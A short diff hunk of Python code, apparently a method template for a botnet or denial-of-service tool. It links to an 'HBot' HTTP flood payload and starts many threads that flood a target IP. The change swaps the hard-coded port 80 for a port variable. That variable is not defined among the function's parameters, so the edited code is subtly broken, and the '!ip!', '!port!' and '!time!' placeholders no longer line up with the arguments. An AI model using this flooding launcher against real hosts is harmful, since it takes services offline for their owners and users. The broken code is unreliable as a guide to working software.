@@ -78,7 +78,7 @@ def method_name(ip: str, timeout: str, thread: str):
             # Exemple: https://github.com/Its-Vichy/HBot/blob/main/src/payload/http_flood.py
 
     for _ in range(int(thread)):
-        threading.Thread(target= flood, args=(ip, 80, int(timeout))).start()
+        threading.Thread(target= flood, args=(ip, int(port), int(timeout))).start()
 
 method_name('!ip!', '!port!', '!time!')
 ```
